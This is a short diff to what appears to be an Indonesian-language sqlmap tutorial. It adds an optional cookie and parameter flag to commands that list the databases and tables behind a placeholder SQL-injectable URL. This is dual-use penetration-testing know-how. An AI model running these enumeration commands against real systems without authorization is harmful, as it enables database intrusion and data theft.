@@ -47,6 +47,11 @@ sqlmap -u "linkinputvulnSqlInjection"
 ```bash
 sqlmap -u "linkinputvulnSqlInjection" --dbs
 ```
+opsional option
+```bash
+--cookie='cookie1=value;cookie2=value' -p 'vulnvariable' 
+```
+
 * Selanjutnya, Masukan perintah berikut untuk melihat daftar tables didalam database yang dipilih
 ```bash
 sqlmap -u "linkinputvulnSqlInjection" -D db_name --tables
